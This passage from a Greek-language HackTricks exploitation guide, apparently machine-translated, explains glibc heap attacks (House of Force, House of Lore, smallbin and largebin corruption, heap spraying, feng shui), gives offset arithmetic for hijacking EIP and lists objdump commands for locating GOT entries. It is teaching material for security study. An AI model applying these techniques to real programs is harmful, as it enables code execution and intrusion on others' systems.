Αν, για παράδειγμα, το πρόγραμμα ρωτούσε τον χρήστη για έναν αριθμό, θα μπορούσαμε να εισάγουμε 48 και να δείξουμε τον τροποποιήσιμο δείκτη malloc στους επόμενους 4bytes (που θα μπορούσαν να ανήκουν στο EBP με τύχη, έτσι το 48 μένει πίσω, σαν να ήταν η κεφαλίδα size). Επιπλέον, η διεύθυνση ptr-4+48 πρέπει να πληροί πολλές προϋποθέσεις (σε αυτή την περίπτωση ptr=EBP), δηλαδή, 8 < ptr-4+48 < av->system\_mem.

Αν αυτό πληροί, όταν κληθεί το επόμενο malloc που είπαμε ότι ήταν malloc(40), θα του ανατεθεί ως διεύθυνση η διεύθυνση του EBP. Σε περίπτωση που ο επιτιθέμενος μπορεί επίσης να ελέγξει τι γράφεται σε αυτό το malloc, μπορεί να υπεργράψει τόσο το EBP όσο και το EIP με τη διεύθυνση που θέλει.

Αυτό πιστεύω ότι συμβαίνει γιατί έτσι όταν το απελευθερώσει το free() θα κρατήσει ότι στη διεύθυνση που δείχνει το EBP της στοίβας υπάρχει ένα κομμάτι τέλειου μεγέθους για το νέο malloc() που θέλει να κρατήσει, έτσι του αναθέτει αυτή τη διεύθυνση.

**The House of Force**

Απαιτείται:

* Μια υπερχείλιση σε ένα κομμάτι που επιτρέπει την υπεργραφή του wilderness
* Μια κλήση στο malloc() με το μέγεθος που καθορίζεται από τον χρήστη
* Μια κλήση στο malloc() των δεδομένων που μπορούν να καθοριστούν από τον χρήστη

Το πρώτο που γίνεται είναι να υπεργραφεί το μέγεθος του κομματιού wilderness με μια πολύ μεγάλη τιμή (0xffffffff), έτσι οποιαδήποτε αίτηση μνήμης αρκετά μεγάλη θα αντιμετωπιστεί στο \_int\_malloc() χωρίς να χρειαστεί να επεκταθεί το heap.

Το δεύτερο είναι να τροποποιηθεί το av->top ώστε να δείχνει σε μια περιοχή μνήμης υπό τον έλεγχο του επιτιθέμενου, όπως η στοίβα. Στο av->top θα τοποθετηθεί \&EIP - 8.

Πρέπει να υπεργράψουμε το av->top ώστε να δείχνει στην περιοχή μνήμης υπό τον έλεγχο του επιτιθέμενου:

victim = av->top;

remainder = chunk\_at\_offset(victim, nb);

av->top = remainder;

Η Victim συλλέγει την τιμή της διεύθυνσης του τρέχοντος κομματιού wilderness (το τρέχον av->top) και το remainder είναι ακριβώς το άθροισμα αυτής της διεύθυνσης με την ποσότητα των bytes που ζητήθηκαν από το malloc(). Έτσι, αν \&EIP-8 είναι στο 0xbffff224 και το av->top περιέχει 0x080c2788, τότε η ποσότητα που πρέπει να κρατήσουμε στο ελεγχόμενο malloc ώστε το av->top να δείχνει στο $EIP-8 για το επόμενο malloc() θα είναι:

0xbffff224 - 0x080c2788 = 3086207644.

Έτσι θα αποθηκευτεί στο av->top η τροποποιημένη τιμή και το επόμενο malloc θα δείχνει στο EIP και θα μπορεί να το υπεργράψει.

Είναι σημαντικό να γνωρίζουμε ότι το μέγεθος του νέου κομματιού wilderness είναι μεγαλύτερο από την αίτηση που έγινε από το τελευταίο malloc(). Δηλαδή, αν το wilderness δείχνει στο \&EIP-8, το μέγεθος θα είναι ακριβώς στο πεδίο EBP της στοίβας.

**The House of Lore**

**Διαφθορά SmallBin**

Τα κομμάτια που απελευθερώνονται εισάγονται στο bin ανάλογα με το μέγεθός τους. Αλλά πριν εισαχθούν, αποθηκεύονται σε unsorted bins. Ένα κομμάτι που απελευθερώνεται δεν εισάγεται αμέσως στο bin του, αλλά παραμένει σε unsorted bins. Στη συνέχεια, αν ζητηθεί ένα νέο κομμάτι και το προηγούμενο απελευθερωμένο μπορεί να χρησιμοποιηθεί, επιστρέφεται, αλλά αν ζητηθεί μεγαλύτερο, το κομμάτι που απελευθερώθηκε σε unsorted bins εισάγεται στο κατάλληλο bin του.

Για να φτάσουμε στον ευάλωτο κώδικα, η αίτηση μνήμης πρέπει να είναι μεγαλύτερη από το av->max\_fast (72 κανονικά) και λιγότερη από το MIN\_LARGE\_SIZE (512).

Αν στο bin υπάρχει ένα κομμάτι του κατάλληλου μεγέθους για αυτό που ζητείται, επιστρέφεται αυτό μετά την αποσύνδεση:

bck = victim->bk; Δείχνει στο προηγούμενο κομμάτι, είναι η μοναδική πληροφορία που μπορούμε να τροποποιήσουμε.

bin->bk = bck; Το προτελευταίο κομμάτι γίνεται το τελευταίο, σε περίπτωση που το bck δείχνει στη στοίβα, στο επόμενο κομμάτι που θα κρατηθεί θα δοθεί αυτή η διεύθυνση.

bck->fd = bin; Κλείνει τη λίστα κάνοντάς την να δείχνει στο bin.

Απαιτείται:

Να κρατηθούν δύο malloc, έτσι ώστε στο πρώτο να μπορεί να γίνει overflow αφού το δεύτερο έχει απελευθερωθεί και εισαχθεί στο bin του (δηλαδή, να έχει κρατηθεί ένα malloc μεγαλύτερο από το δεύτερο κομμάτι πριν γίνει η υπερχείλιση).

Να ελέγχεται το malloc που έχει κρατηθεί και του οποίου η διεύθυνση επιλέγεται από τον επιτιθέμενο.

Ο στόχος είναι ο εξής, αν μπορούμε να κάνουμε μια υπερχείλιση σε ένα heap που έχει από κάτω ένα κομμάτι που έχει ήδη απελευθερωθεί και είναι στο bin του, μπορούμε να τροποποιήσουμε τον δείκτη bk του. Αν τροποποιήσουμε τον δείκτη bk του και αυτό το κομμάτι γίνει το πρώτο της λίστας bin και κρατηθεί, το bin θα παραπλανηθεί και θα του πει ότι το τελευταίο κομμάτι της λίστας (το επόμενο που θα προσφερθεί) είναι στη διεύθυνση ψεύτικη που έχουμε βάλει (στη στοίβα ή GOT, για παράδειγμα). Έτσι, αν κρατηθεί ένα άλλο κομμάτι και ο επιτιθέμενος έχει άδεια σε αυτό, θα του δοθεί ένα κομμάτι στη θέση που επιθυμεί και θα μπορεί να γράψει σε αυτήν.

Μετά την απελευθέρωση του τροποποιημένου κομματιού είναι απαραίτητο να κρατηθεί ένα κομμάτι μεγαλύτερο από το απελευθερωμένο, έτσι το τροποποιημένο κομμάτι θα βγει από τα unsorted bins και θα εισαχθεί στο bin του.

Μόλις είναι στο bin του, είναι η στιγμή να τροποποιηθεί ο δείκτης bk μέσω της υπερχείλισης ώστε να δείχνει στη διεύθυνση που θέλουμε να υπεργράψουμε.

Έτσι, το bin θα περιμένει τη σειρά του ώστε να κληθούν αρκετές φορές οι malloc() ώστε να ξαναχρησιμοποιηθεί το τροποποιημένο bin και να παραπλανήσει το bin κάνοντάς του να πιστέψει ότι το επόμενο κομμάτι είναι στη ψεύτικη διεύθυνση. Και στη συνέχεια θα δοθεί το κομμάτι που μας ενδιαφέρει.

Για να εκτελεστεί η ευπάθεια το συντομότερο δυνατό, το ιδανικό θα ήταν: Κράτηση του ευάλωτου κομματιού, κράτηση του κομματιού που θα τροποποιηθεί, απελευθέρωση αυτού του κομματιού, κράτηση ενός κομματιού μεγαλύτερου από αυτό που θα τροποποιηθεί, τροποποίηση του κομματιού (ευπάθεια), κράτηση ενός κομματιού ίσου μεγέθους με το ευάλωτο και κράτηση ενός δεύτερου κομματιού ίσου μεγέθους και αυτό θα είναι αυτό που θα δείχνει στη διεύθυνση που επιλέγεται.

Για να προστατευτεί αυτή η επίθεση χρησιμοποιήθηκε η τυπική επαλήθευση ότι το κομμάτι “δεν” είναι ψεύτικο: ελέγχεται αν το bck->fd δείχνει στο victim. Δηλαδή, στην περίπτωσή μας αν ο δείκτης fd\* του ψεύτικου κομματιού που δείχνει στη στοίβα δείχνει στο victim. Για να παρακαμφθεί αυτή η προστασία, ο επιτιθέμενος θα πρέπει να είναι σε θέση να γράψει με κάποιο τρόπο (πιθανώς μέσω της στοίβας) στη σωστή διεύθυνση τη διεύθυνση του victim. Έτσι ώστε να φαίνεται σαν ένα πραγματικό κομμάτι.

**Διαφθορά LargeBin**

Απαιτούνται οι ίδιες προϋποθέσεις όπως πριν και μερικές ακόμη, επιπλέον τα κομμάτια που κρατούνται πρέπει να είναι μεγαλύτερα από 512.

Η επίθεση είναι όπως η προηγούμενη, δηλαδή, πρέπει να τροποποιηθεί ο δείκτης bk και απαιτούνται όλες αυτές οι κλήσεις σε malloc(), αλλά επιπλέον πρέπει να τροποποιηθεί το μέγεθος του τροποποιημένου κομματιού έτσι ώστε αυτό το μέγεθος - nb να είναι < MINSIZE.

Για παράδειγμα, θα κάνει να βάλουμε στο μέγεθος 1552 ώστε 1552 - 1544 = 8 < MINSIZE (η αφαίρεση δεν μπορεί να είναι αρνητική γιατί συγκρίνεται ένα unsigned).

Επιπλέον, έχει εισαχθεί μια επιδιόρθωση για να γίνει ακόμη πιο περίπλοκο.

**Heap Spraying**

Βασικά συνίσταται στην κράτηση όλης της δυνατής μνήμης για heaps και γέμισμα αυτών με ένα στρώμα nops που καταλήγει σε μια shellcode. Επιπλέον, ως στρώμα χρησιμοποιείται το 0x0c. Έτσι, θα προσπαθήσουμε να παραλείψουμε στη διεύθυνση 0x0c0c0c0c, και έτσι αν υπεργραφεί κάποια διεύθυνση στην οποία θα κληθεί με αυτό το στρώμα, θα παραλειφθεί εκεί. Βασικά η τακτική είναι να κρατήσουμε το μέγιστο δυνατό για να δούμε αν υπεργραφεί κάποιος δείκτης και να παραλείψουμε στο 0x0c0c0c0c περιμένοντας ότι εκεί θα υπάρχουν nops.

**Heap Feng Shui**

Συνίσταται στο να σπείρουμε τη μνήμη μέσω κρατήσεων και απελευθερώσεων έτσι ώστε να παραμένουν κομμάτια κρατημένα ανάμεσα σε ελεύθερα κομμάτια. Ο buffer που θα υπερχειλίσει θα τοποθετηθεί σε ένα από τα αυγά.

**objdump -d εκτελέσιμο** —> Disas functions\
**objdump -d ./ΠΡΟΓΡΑΜΜΑ | grep ΣΥΝΑΡΤΗΣΗ** —> Λάβετε τη διεύθυνση της συνάρτησης\
**objdump -d -Mintel ./shellcodeout** —> Για να δούμε ότι είναι πράγματι η shellcode μας και να εξάγουμε τους OpCodes\
**objdump -t ./exec | grep varBss** —> Πίνακας συμβόλων, για να εξάγουμε τη διεύθυνση μεταβλητών και συναρτήσεων\
**objdump -TR ./exec | grep exit(func lib)** —> Για να εξάγουμε τη διεύθυνση συναρτήσεων βιβλιοθηκών (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> Εξάγει τη διεύθυνση του puts προς υπεργραφή στη GOT\
**objdump -D ./exec** —> Disas ALL μέχρι τις εισόδους της plt\
**objdump -p -/exec**\
**Info functions strncmp —>** Πληροφορίες για τη συνάρτηση στο gdb

## Ενδιαφέροντα μαθήματα

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Αναφορές**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
